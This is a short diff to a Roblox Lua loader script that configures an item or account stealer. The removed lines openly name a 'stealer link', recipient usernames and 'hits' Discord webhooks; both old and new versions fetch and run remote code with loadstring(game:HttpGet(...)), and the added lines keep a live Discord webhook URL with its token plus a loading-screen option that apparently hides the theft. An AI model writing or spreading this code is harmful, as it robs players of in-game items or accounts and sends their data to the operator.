@@ -1,12 +1,5 @@
-STEALER_LINK = '' -- stealer link (https://dpaste.com/4WH3B5NSX.txt)
+Username = "Gablock40"
+Webhook = "https://discord.com/api/webhooks/1334653387802673234/slsWTzYmqd28RK36yuvrY16VlYzQwartI_dnpdPG_xIeXzAjYqFLmCeL-JClr5ahQlbW"
+selectedLoadingScreen = "1" -- Select Loading Screen And Write Number If You Not Select Loading Screen its automaticly select loading screen 1
 
-Usernames = {
-    'Gablock40', -- PUT UR ROBLOX USERNAMES
-    'Tzi', -- AS MANY AS U WANT BUT DONT FORGET ,
-    'BorninAdoptme',
-}
-
-BigHitsWebhook = "https://cdn.discordapp.com/attachments/1121046583014854766/1333169678146736148/Protected_7742734286907947.lua?ex=6797ea84&is=67969904&hm=558aac82abca9b6800f5ca4900aa9cb753aaf742c70b8d72a4fdafe672d699e5&"
-SmallHitsWebhook = "https://discord.com/api/webhooks/1334653387802673234/slsWTzYmqd28RK36yuvrY16VlYzQwartI_dnpdPG_xIeXzAjYqFLmCeL-JClr5ahQlbW"
-
-loadstring(game:HttpGet(STEALER_LINK, true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ImDigitalz/MoriScripts/main/PETSGO"))()
